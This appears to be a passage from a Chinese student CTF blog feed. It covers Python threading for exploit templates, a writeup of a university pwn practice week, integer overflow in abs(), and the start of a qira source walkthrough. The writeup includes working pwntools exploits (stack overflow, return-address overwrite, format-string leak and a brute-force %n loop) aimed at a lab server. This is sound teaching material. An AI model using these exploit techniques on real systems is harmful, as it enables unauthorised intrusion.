    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>之前一直想重构一下自己的exploit模板脚本，今天，终于有空做一下，主要加入了多线程逐字节爆破的功能，这就涉及多线程的操作，记录一下</p><h1 id="0x01-python-多线程"><a href="#0x01-python-多线程" class="headerlink" title="0x01 python 多线程"></a>0x01 python 多线程</h1><p>python 2.7多线程库有两个一个是thread和threading</p><p>其区别：</p><ul><li><a href="https://blog.csdn.net/zhijianshaman/article/details/81383294" target="_blank" rel="noopener">https://blog.csdn.net/zhijianshaman/article/details/81383294</a></li></ul><p>令我感触比较大的就是我一开始是用面向过程的方式去实现多线程，各种出错，而且还不容易管理（<del>线程还没运行完，主进程就运行完了，线程也跟着直接推出了 2333，只能sleep</del>），之后发现threading库真香，jion()函数可以等所有线程运行完，之后主进程再执行下面的代码，真实太好用，用类的话，也降低了耦合度，如果要加什么，就可以直接加，不需要改太多代码</p><h1 id="0x02-模板下一步改进"><a href="#0x02-模板下一步改进" class="headerlink" title="0x02 模板下一步改进"></a>0x02 模板下一步改进</h1><ul><li>github地址 <a href="https://github.com/pwnht/exp" target="_blank" rel="noopener">https://github.com/pwnht/exp</a></li><li>把main函数也封装一个类，这样操作更方便一下</li><li>pow()函数也需要改进一下，一个线程运行成功之后，应该通知主进程，把其他线程都杀掉，这样这个线程irt（）就可以成功了，主进程杀线程也需要时间，所以，要sleep一下，irt（）</li></ul>]]></content>
    
    <summary type="html">
    
      这里总结下python多线程的经历
    
    </summary>
    
    
    
      <category term="python,多线程" scheme="http://yoursite.com/tags/python-%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>漏洞理论分析的一些思考</title>
    <link href="http://yoursite.com/2019/11/16/%E6%BC%8F%E6%B4%9E%E7%90%86%E8%AE%BA%E5%88%86%E6%9E%90%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/"/>
    <id>http://yoursite.com/2019/11/16/漏洞理论分析的一些思考/</id>
    <published>2019-11-16T03:09:09.000Z</published>
    <updated>2019-11-16T03:22:58.521Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前打上海那场比赛，让我有了一些思考，对于漏洞挖掘，有的时候，我们明明知道有整数溢出，但是，发现不可控，真的是不可控的吗？？？</p><h1 id="理论分析的一些步骤"><a href="#理论分析的一些步骤" class="headerlink" title="理论分析的一些步骤"></a>理论分析的一些步骤</h1><p>在分析一个程序某一个表达式有没有漏洞的时候，应该首先分析</p><ul><li><p>这个表达式有几个参数</p></li><li><p>几个可控</p></li><li><p>各个参数可能取到的值，有几种组合，</p></li><li><p>每种组合安不安全，如果，都安全，则这个点，安全，否则，就不能信任这一个表达式</p></li></ul><p>但是，我们有不可能取手动尝试，所有的组合，所以，就要找每个参数的边界，或者说代表值，但是，在计算机中一个值并不能代表一个范围的值，比如说，我测试了1和9，但这并不代表1-9，所有的数值都是安全的，应该根据不同的程序，将值分为不同的类，分别进行测试</p>]]></content>
    
    <summary type="html">
    
      这里总结一下，分析一个程序有没有漏洞的一些思考
    
    </summary>
    
    
    
      <category term="理论分析" scheme="http://yoursite.com/tags/%E7%90%86%E8%AE%BA%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>2019冬季赛第一周习题练习总结</title>
    <link href="http://yoursite.com/2019/11/05/2019%E5%86%AC%E5%AD%A3%E8%B5%9B%E7%AC%AC%E4%B8%80%E5%91%A8%E4%B9%A0%E9%A2%98%E7%BB%83%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2019/11/05/2019冬季赛第一周习题练习总结/</id>
    <published>2019-11-05T08:18:00.000Z</published>
    <updated>2019-12-04T04:32:20.419Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>冬季赛第一周练习题目完美结束，从周日搭环境（<del>周末每天早出晚归，我感觉我要死了</del>）到现在审核writeup，没有出现什么大问题（<del>我周日下午花了一下午布置题目，测试题目是否能打通，然后，然后,2个小时，2道题目被打穿了，？？？？这里手动@哒君，出的什么题目？？？？，还得让我加班</del>），（<del>其实也不能怪哒君因为</del>）我们18级还是有大佬的（<del>iyzyi牛啤，拿到了3道pwn题目的一血</del>）</p><h1 id="0x01-练习题目重大时间表"><a href="#0x01-练习题目重大时间表" class="headerlink" title="0x01 练习题目重大时间表"></a>0x01 练习题目重大时间表</h1><ul><li>周日下午first try、easy_second_try题目上线</li><li>周日晚上iyzyi拿到两道题目的一血</li><li>周日晚上printf题目上线</li><li>周一晚上给出hint</li><li>周一晚上iyzyi拿到printf题目的一血</li><li>周一晚上normal(第一周压轴题)上线</li><li>截止周二晚上还没有被解出（<del>哒君tql</del>）</li></ul><h1 id="0x02-最终版writeup-by-iyzyi"><a href="#0x02-最终版writeup-by-iyzyi" class="headerlink" title="0x02 最终版writeup by iyzyi"></a>0x02 最终版writeup by iyzyi</h1><h2 id="0x00-写在前面"><a href="#0x00-写在前面" class="headerlink" title="0x00 写在前面"></a>0x00 写在前面</h2><p>刚开始学pwn，有些地方可能理解的不对，有错误的话希望大家可以指出来，谢谢。</p><p>使用到了<strong>python2 </strong>的一个模块pwn（pip时Ubuntu下是pwn、CentOS7中是pwntools），不能在windows下使用。</p><p>python3应该也可以使用pwntools，但我还没有实践过，这里不详细说。</p><p>我的环境为Ubuntu16.04，python2.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#Ubuntu下安装pwn</span><br><span class="line">apt-get update</span><br><span class="line">apt install python-pip</span><br><span class="line">pip install pwn</span><br><span class="line"></span><br><span class="line">#CentOS7下安装pwntools</span><br><span class="line">#http://www.ishenping.com/ArtInfo/234398.html</span><br><span class="line">#https://github.com/facebook/prophet/issues/418</span><br><span class="line">#注意：python2和python3同时存在的，所有pip命令都要加上python2 -m的前缀</span><br><span class="line">#如python2 -m pip install pwntools</span><br><span class="line">yum -y install python-pip</span><br><span class="line">pip install --upgrade setuptools</span><br><span class="line">pip install pwntools</span><br></pre></td></tr></table></figure><p>Ubuntu比较适合pwntools，CentOS的坑比较多。推荐Ubuntu哈</p><h3 id="0x00-来自pwnht的评论（闲话-补充？？？？？）"><a href="#0x00-来自pwnht的评论（闲话-补充？？？？？）" class="headerlink" title="0x00 来自pwnht的评论（闲话/补充？？？？？）"></a>0x00 来自pwnht的评论（<del>闲话/补充？？？？？</del>）</h3><p><strong>ubuntu安装的时候也可以安装pwntools</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pwntools</span><br></pre></td></tr></table></figure><p>我之前都不知道有pwn这个库，但是用法是一样的，却是两个库，额，建议pwntools哈，可以从下面来，pwn这个最后一次更新在2014，好像已经停止更新了，而pwntools最后一次更新是在2019（<del>一看 <strong>pwntools</strong> 的 <strong>decription</strong> 就比较帅，知道选谁了吧</del>）</p><p><img src="/2019/11/05/2019冬季赛第一周习题练习总结/1572938462520.png" alt="1572938462520"></p><p><img src="/2019/11/05/2019冬季赛第一周习题练习总结/1572938436162.png" alt="1572938481627"></p><h2 id="0x01-first-try"><a href="#0x01-first-try" class="headerlink" title="0x01 first try"></a>0x01 first try</h2><p><img src="/2019/11/05/2019冬季赛第一周习题练习总结/2174619181.png" alt="1572860587050"></p><p>32位，用ida打开，按下f5将汇编转换成伪C代码。</p><h3 id="0x00-来自pwnht的评论（闲话-补充？？？？？）-1"><a href="#0x00-来自pwnht的评论（闲话-补充？？？？？）-1" class="headerlink" title="0x00 来自pwnht的评论（闲话/补充？？？？？）"></a>0x00 来自pwnht的评论（<del>闲话/补充？？？？？</del>）</h3><p>理论上来说，我们第一步是checksec，一般pwn题目是不加壳的，但是，会有一些程序保护（<del>详情参考的我ppt程序保护部分</del>），幸运的是这几道题目都没保护2333，其实，checksec是有一个脚本的，但是我更喜欢用ipython这个程序,安装ipython</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install ipython</span><br></pre></td></tr></table></figure><p><img src="/2019/11/05/2019冬季赛第一周习题练习总结/1572939083748.png" alt="1572939083748"></p><p>像这样操作，linux里面arch表示程序的是哪种操作系统类型（i386为32位，amd64为64位），然后下面是4种保护，红色表示程序保护没开，绿色表示开启</p><p>（<del>其实ida也能分辨64位和32位试一试就知道会有标识的</del>）</p><p>（<del>下面是分割线</del>）</p><hr><p><img src="/2019/11/05/2019冬季赛第一周习题练习总结/2553210574.png" alt="1572861112066"></p><p>要想拿到shell，就要满足v6=99(第30行)。</p><p>本题存在两处输入，其中第11行的read()函数存在明显的栈溢出。</p><p>双击程序中的任意参数或局部变量，均可跳转至所在函数的栈界面：</p><p><img src="/2019/11/05/2019冬季赛第一周习题练习总结/1141603613.png" alt="1572861550853"></p><p>容易发现，s字符串的长度为0x1C-0x0C=16，而read()函数可以读入50个字符。当读完16个字符后，如果继续输入，程序并不会停止，而是继续将数据读入栈中，这就会覆盖掉其他的数据。比如写入的第17个字符会覆盖掉上图中的var_C.</p><p>var_C恰好就是之前的v6。</p><p>把鼠标光标放在v6上，就会自动显示v6在栈内的位置。</p><p><img src="/2019/11/05/2019冬季赛第一周习题练习总结/355552310.png" alt="1572861947922"></p><p>或者双击下v6。</p><h3 id="0x01-来自pwnht的评论（闲话-补充？？？？？）"><a href="#0x01-来自pwnht的评论（闲话-补充？？？？？）" class="headerlink" title="0x01 来自pwnht的评论（闲话/补充？？？？？）"></a>0x01 来自pwnht的评论（<del>闲话/补充？？？？？</del>）</h3><p>其实这里不用悬停的，或者双击的，因为</p><p><img src="/2019/11/05/2019冬季赛第一周习题练习总结/1572939698973.png" alt="1572939698973"></p><p>滑一下鼠标就可以了，复杂的程序可以悬停，（<del>都行其实2333，怎么快怎么来哈</del>）</p><p>（<del>下面是分割线</del>）</p><hr><p>上图中的esp是栈顶指针，ebp是栈的基址。</p><p>话有些多，直接写脚本吧。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'202.119.201.199'</span>, <span class="number">10000</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x1c</span><span class="number">-0x0c</span>) + p32(<span class="number">99</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>第一行，导入pwn模块</p><p>第二行，连接到服务器</p><p>第四行，sendline发送payload</p><p>第五行，进入交互。此时输入cat flag即可拿到flag</p><p>payload的前半部分就是16个字符，写满字符串s，第十七个字节就是我们要修改的v6.</p><p>p32()可以将99转换成一个32位的数据。</p><h3 id="0x02-来自pwnht的评论（闲话-补充？？？？？）"><a href="#0x02-来自pwnht的评论（闲话-补充？？？？？）" class="headerlink" title="0x02 来自pwnht的评论（闲话/补充？？？？？）"></a>0x02 来自pwnht的评论（<del>闲话/补充？？？？？</del>）</h3><p>这里注意，写expliot脚本的一个好习惯，遇到 <strong>read（）</strong> 要用 <strong>send（）</strong> 不要用 <strong>sendline（）</strong></p><p>这道题目，两个都行，换其他题目可能会多读一个<strong>\n</strong> (换行符即’\x0a’),  （<del>注意大坑,相信我</del>）</p><p>还有遇到多次输入的时候，就不能用 <strong>send（)</strong> 函数了,要用 <strong>sendafter（)</strong> 或者 <strong>sleep（）</strong> 来控制流程</p><p>附上我的expliot</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python </span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line">io=remote(&apos;202.119.201.199&apos;,10000)</span><br><span class="line">#io=process(&apos;./first&apos;)</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">io.sendafter(&apos;do you want to change it?(yes|no)\n&apos;,&apos;a&apos;*0x10+p32(99))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>基本上差不多哈</p><p>（<del>下面是分割线</del>）</p><hr><h2 id="0x02-easy-second-try"><a href="#0x02-easy-second-try" class="headerlink" title="0x02 easy_second_try"></a>0x02 easy_second_try</h2><p><img src="/2019/11/05/2019冬季赛第一周习题练习总结/242793795.png" alt="1572862797345"></p><p>使用ida64打开</p><h3 id="0x00-来自pwnht的评论（闲话-补充？？？？？）-2"><a href="#0x00-来自pwnht的评论（闲话-补充？？？？？）-2" class="headerlink" title="0x00 来自pwnht的评论（闲话/补充？？？？？）"></a>0x00 来自pwnht的评论（<del>闲话/补充？？？？？</del>）</h3><p>同样需要checksec不多说</p><p>（<del>下面是分割线</del>）</p><hr><p><img src="/2019/11/05/2019冬季赛第一周习题练习总结/1158424088.png" alt="1572862841416"></p><p>主函数输入姓名，输出姓名，就结束了。</p><p>同时可以看到read()明显的栈溢出。</p><p><img src="/2019/11/05/2019冬季赛第一周习题练习总结/3763989548.png" alt="1572862917274"></p><p>上面的s是输入的字符串，下面的s是ebp（<strong>此处存疑哈 </strong>），下面的r是函数运行完的返回地址。当这个函数运行完时，程序会跳转至r所储存的地址处，继续运行。</p><p><img src="/2019/11/05/2019冬季赛第一周习题练习总结/859230983.png" alt="1572432617470"></p><p>参考阅读《加密与解密》P106.</p><p>上图的栈和上上图的栈，顺序是相反的，对照的时候注意下。</p><p>函数列表内有个sys函数</p><p><img src="/2019/11/05/2019冬季赛第一周习题练习总结/1992114906.png" alt="1572863298186"></p><p><img src="/2019/11/05/2019冬季赛第一周习题练习总结/2464934511.png" alt="1572863306697"></p><p>可以调用shell.</p><p>所以我们通过read()函数，多读入一些字节，将r返回地址覆写为sys的地址，就可以调用这个shell了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'202.119.201.199'</span>, <span class="number">10002</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x10</span>+<span class="number">8</span>) + p64(<span class="number">0x400789</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>payload中，0x10是字符串长度，8是8位的ebp，0x400789是sys的地址，p64将其转换为64位的数据</p><p>就酱~</p><h3 id="0x00-来自pwnht的评论（闲话-补充？？？？？）-3"><a href="#0x00-来自pwnht的评论（闲话-补充？？？？？）-3" class="headerlink" title="0x00 来自pwnht的评论（闲话/补充？？？？？）"></a>0x00 来自pwnht的评论（<del>闲话/补充？？？？？</del>）</h3><p>同样的问题不在赘述</p><p>下面是分割线</p><hr><h2 id="0x03-printf"><a href="#0x03-printf" class="headerlink" title="0x03 printf"></a>0x03 printf</h2><p><img src="/2019/11/05/2019冬季赛第一周习题练习总结/3267216144.png" alt="1572928882030"></p><p>随机一个数字，输入一个数字，二者相等则拿到shell.</p><p>第25行存在printf格式化字符串漏洞。</p><p>先来看一下相关知识：</p><ul><li><a href="https://wiki.x10sec.org/pwn/fmtstr/fmtstr_exploit/" target="_blank" rel="noopener">CTF WiFi：格式化字符串漏洞利用</a></li><li><a href="https://blog.qsboy.com/format-string-bug/" target="_blank" rel="noopener">CTF - Pwn - 格式化字符串漏洞</a></li><li><a href="https://introspelliam.github.io/2017/08/04/printf%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">printf格式化漏洞</a></li><li><a href="https://veritas501.space/2017/04/28/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">格式化字符串漏洞学习</a></li></ul><p>我浅显地总结一下：</p><p>常见的printf有两（及以上）个参数，如<code>printf(&quot;%d&quot;, &amp;a);</code>。但其实printf只需要一个参数，<code>printf(&quot;%d%d&quot;);</code>，需要参数时从栈顶依次读入即可。前面的<code>printf(&quot;%d&quot;, &amp;a);</code>本质上就是先把a的地址压入栈内，然后printf读栈顶元素并输出。</p><p>printf函数的第一个参数就是格式化字符串。</p><p>正常的程序，这个格式化字符串应该是写死在代码里的，但是本题printf的那个字符串是我们输入的，所以我们可以通过一些方式来输出一些数据（或写入一些数据）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%d - 十进制 - 输出十进制整数</span><br><span class="line">%s - 字符串 - 从内存中读取字符串</span><br><span class="line">%x - 十六进制 - 输出十六进制数</span><br><span class="line">%c - 字符 - 输出字符</span><br><span class="line">%p - 指针 - 指针地址</span><br><span class="line">%n - 到目前为止所写的字符数</span><br></pre></td></tr></table></figure><p>%x表示输出栈顶的那个十六进制数据，%i$x表示输出偏离栈顶i处的十六进制数据。</p><p>我们现来测试下程序运行到printf()处，栈的情况。</p><p>did you hear that?输入长度不超过16的字符串即可。然后do you understand输入7个%p，程序输入从栈顶到偏移栈顶7个32位处的7个十六进制数。</p><p><img src="/2019/11/05/2019冬季赛第一周习题练习总结/233118200.png" alt="1572930088113"></p><p>第7个参数输出的是%p%p(0x70是p,0x25是%)，所以我们确定了输入的%p%p%p%p%p%p%p这个字符串是从栈内偏移7处开始的(ebp+7)。<br><img src="/2019/11/05/2019冬季赛第一周习题练习总结/724262807.png" alt="1572930264700"></p><p>0x2c处就是我们输入的字符串的起始位置。我们想要知道的那个随机数在0x0C的var_C处。二者偏移量为（0x2c-0x0c)//4=8，除以4是因为这是32位程序。</p><p>buf相对栈顶偏移7，var_C相对buf偏移8，即var_C相对栈顶偏移15</p><p>不用脚本，直接手撸</p><p><img src="/2019/11/05/2019冬季赛第一周习题练习总结/4065706008.png" alt="1572866025044"></p><p>拿到随机数0xa08457，转换成十进制数10519639，输进去，拿到shell.</p><h3 id="0x00-来自pwnht的评论（闲话-补充？？？？？）-4"><a href="#0x00-来自pwnht的评论（闲话-补充？？？？？）-4" class="headerlink" title="0x00 来自pwnht的评论（闲话/补充？？？？？）"></a>0x00 来自pwnht的评论（<del>闲话/补充？？？？？</del>）</h3><p>你的非预期解呢？？？？？？</p><h3 id="0x01-来自iyzyi的补充"><a href="#0x01-来自iyzyi的补充" class="headerlink" title="0x01 来自iyzyi的补充"></a>0x01 来自iyzyi的补充</h3><p>嗯，这道题在pwnht提示我之前，我不是这么考虑的。</p><p>先说一下格式化字符串中的%n。%n的作用是向保存在栈顶的一个地址处写入一个数，这个数是字符串中位于%n前面的字符的数量。%i$n的作用类似，不过是向偏移栈顶i处保存的地址中写入一个数。比如，对照着上上上图，“abc%6$n”就是向0xf770f244处写入3.</p><p>但是，一定要注意，对应的栈中的参数必须是一个合法的地址。比如对照着上上上图，“abc%2$n”就是向0x10处写入3。0x10不是个地址，所以程序会崩溃。</p><p>有了以上知识，那我就开始说一下我最初的思路，非预期解。应该可以解题，但是成功的概率实在感人。</p><p>我是想通过%n向v8处写入一个数，然后我再输入这个数，自然就可以拿到shell.</p><p>但是，万万没有想到，这题v8的地址是一直在改变的，根据我的多次测试，其地址大概位于0xff800000到0xffffffff之间。</p><p>于是我就想碰撞一下地址。我在程序里写了个地址，假设它就是字符串的地址，再通过偏移量算出v8的地址。如果某一次程序恰好将字符串加载到我假设的地址处，那么我就可以向v8写入相应的字符数量。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10000000</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = remote(<span class="string">'202.119.201.199'</span>, <span class="number">10001</span>)</span><br><span class="line">        context.log_level = <span class="string">'debug'</span></span><br><span class="line">        p.sendlineafter(<span class="string">'Did you hear that?'</span>, <span class="string">'yes\n'</span>)</span><br><span class="line">        payload = p32(<span class="number">0xff9594ec</span>+(<span class="number">0x2c</span><span class="number">-0xc</span>)) + <span class="string">'%7$n'</span></span><br><span class="line">        p.sendlineafter(<span class="string">'do you understand?'</span>, payload)</span><br><span class="line">        p.sendlineafter(<span class="string">'just tell me how mang is it!'</span>, <span class="string">'4'</span>)</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'EFO again~~~~~'</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> p.recvline_contains(<span class="string">'haha, I know you can\'t do it!'</span>):</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'NO~~~~~~'</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        p.interactive()</span><br></pre></td></tr></table></figure><p>如果%7$n不是向一个合法的地址处写入，程序会timeout: the monitored command dumped core\n，报错EOFError。为了程序的程序化运行，捕捉了这个异常。</p><p>如果恰好碰撞到了一个地址，但是又不是我们需要的那个目标地址，程序会按照流程输出haha, I know you can\’t do it! 此时我们使用continue跳过这次碰撞。</p><p>对了，说明一下，这个脚本不一定正确哈。我还没有跑出来（跑得CPU都糊了）。有兴趣的可以试试。</p><p>为了说明一下成功的概率，我放一个数字：0xffffffff-0xff800000=0x7fffff=2^23=8388608。</p><h2 id="0x04-来自pwnht的结语"><a href="#0x04-来自pwnht的结语" class="headerlink" title="0x04 来自pwnht的结语"></a>0x04 来自pwnht的结语</h2><p>小学弟整体写的还是比较认真的，值得表扬，一些d地方需要改进，希望采纳，注意文章结构，一道题目要分步骤的，一步写完可不行 2333（<del>iyzyi牛啤拿下本周pwn三个一血</del>）</p>]]></content>
    
    <summary type="html">
    
      2019冬季赛第一周pwn练习题目完美结束
    
    </summary>
    
    
    
      <category term="2019cumtctf" scheme="http://yoursite.com/tags/2019cumtctf/"/>
    
  </entry>
  
  <entry>
    <title>整数溢出思考</title>
    <link href="http://yoursite.com/2019/11/03/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%80%9D%E8%80%83/"/>
    <id>http://yoursite.com/2019/11/03/整数溢出思考/</id>
    <published>2019-11-03T01:17:48.000Z</published>
    <updated>2019-11-25T04:48:33.180Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-漏洞点"><a href="#0x00-漏洞点" class="headerlink" title="0x00 漏洞点"></a>0x00 漏洞点</h2><p>这个题目是一个常规堆题目，其他地方没有发现漏洞点，看到abs()函数，就可以想到可能会有整数溢出，有意思的是，abs（）函数是通过汇编实现的，并不是glibc库abs()函数，该函数有两种实现方式，第一种方式使用了3次，第二种方式用了一次，下面分析一下这两种实现方式</p><h2 id="0x01-第一种汇编语言实现方式"><a href="#0x01-第一种汇编语言实现方式" class="headerlink" title="0x01 第一种汇编语言实现方式"></a>0x01 第一种汇编语言实现方式</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000000F91                 mov     edx, eax</span><br><span class="line">.text:0000000000000F93                 mov     eax, edx</span><br><span class="line">.text:0000000000000F95                 sar     eax, 1Fh</span><br><span class="line">.text:0000000000000F98                 mov     ecx, edx</span><br><span class="line">.text:0000000000000F9A                 xor     ecx, eax</span><br><span class="line">.text:0000000000000F9C                 sub     ecx, eax</span><br></pre></td></tr></table></figure><ul><li>首先会通过一个函数将你输入的值放到eax</li><li>然后把eax给edx</li><li>eax的第31位右移31位，（<del>就是如果你eax第32位是1的话，结果，eax是全f，否则为0</del>）</li><li>然后把edx给ecx</li><li>ecx和eax异或</li><li>ecx减eax</li></ul><p>总的来说，就是如果eax第31位为1的话，就会执行eax各位取反再加一，否则，eax不变</p><p>那么这样的话，如何得到31位有符号的负数呢</p><p>我可以想到0x80000000这个数，这个数十进制的话是-2147483648，各位取反就是0x7fffffff再加一 ，还是0x80000000而在有符号数里面，0x80000000仍然为一个负数，所以，发生了整数溢出，这也是abs()函数在libc库里面正常的实现方式</p><h2 id="0x02-第二种汇编实现方式"><a href="#0x02-第二种汇编实现方式" class="headerlink" title="0x02 第二种汇编实现方式"></a>0x02 第二种汇编实现方式</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000001042                 cdq</span><br><span class="line">.text:0000000000001043                 xor     eax, edx</span><br><span class="line">.text:0000000000001045                 sub     eax, edx</span><br></pre></td></tr></table></figure><p>突然发现和第一种方式，殊途同归，操作的结果是一样的。。。。</p>]]></content>
    
    <summary type="html">
    
      这里总结整数溢出的一个题目，主要对漏洞挖掘的一个思维漏洞
    
    </summary>
    
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>qira源码分析</title>
    <link href="http://yoursite.com/2019/10/28/qira%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2019/10/28/qira源码分析/</id>
    <published>2019-10-28T12:54:29.000Z</published>
    <updated>2019-10-29T16:05:53.521Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>之前很早用过 <strong>qira</strong> 这款工具，由于种种原因（<del>安装太难了、界面ui。。。</del>），做一些二进制分析，还是gdb好用，在和18、19级培训完之后，老师说ppt应该多加图片，但是之后培训动态调试程序的时候，因为学弟、学妹们都比较萌新用gdb调试，肯定都会看蒙掉，需要一些可复现而且操作简单的gui工具，所以，我想到了qira，但是qira的界面太乱了，我准备优化一下，要改就要知道运行原理，所以，我准备先分析一下源代码（<del>还好qira是开源的，真好</del>）</p><h1 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a>0x01 安装</h1><p><del>尽人事，听天命，如果，不行就换个虚拟机吧。。。。</del><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/geohot/qira.git</span><br><span class="line">cd qira</span><br><span class="line">sudo ./install.sh</span><br></pre></td></tr></table></figure></p><p>还是安装最新版的吧</p><h1 id="0x02-安装过程分析"><a href="#0x02-安装过程分析" class="headerlink" title="0x02 安装过程分析"></a>0x02 安装过程分析</h1><p>首先分析一下 <strong>install.sh</strong> 脚本，执行了以下几个步骤：</p><ul><li><p>安装一些工具</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get -y install git curl python python-virtualenv python-dev build-essential pkg-config zlib1g-dev libglib2.0-dev libpixman-1-dev</span><br></pre></td></tr></table></figure></li><li><p>构建qemu(见源码tracers/qemu_build.sh)</p></li><li><p>构建python虚拟环境</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">virtualenv venv</span><br><span class="line">source venv/bin/activate</span><br><span class="line">pip install --upgrade pip</span><br><span class="line">pip install --upgrade -r requirements.txt</span><br></pre></td></tr></table></figure></li><li><p>运行测试脚本</p></li><li>建立软连接到 <strong>/usr/local/bin</strong>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -sf $(pwd)/qira /usr/local/bin/qira</span><br></pre></td></tr></table></figure></li></ul><p>这样就完成了安装，那么我们运行qira程序的时候，其实，是运行qira源码文件夹下qira这个脚本</p><h1 id="0x03-qira脚本分析"><a href="#0x03-qira脚本分析" class="headerlink" title="0x03 qira脚本分析"></a>0x03 qira脚本分析</h1><ul><li>先是做一些判断</li><li>清除PYTHONPATH环境变量</li><li><p>导入新的环境变量</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source $DIR/venv/bin/activate</span><br></pre></td></tr></table></figure></li><li><p>运行/middleware/qira.py文件</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec /usr/bin/env python $DIR/middleware/qira.py 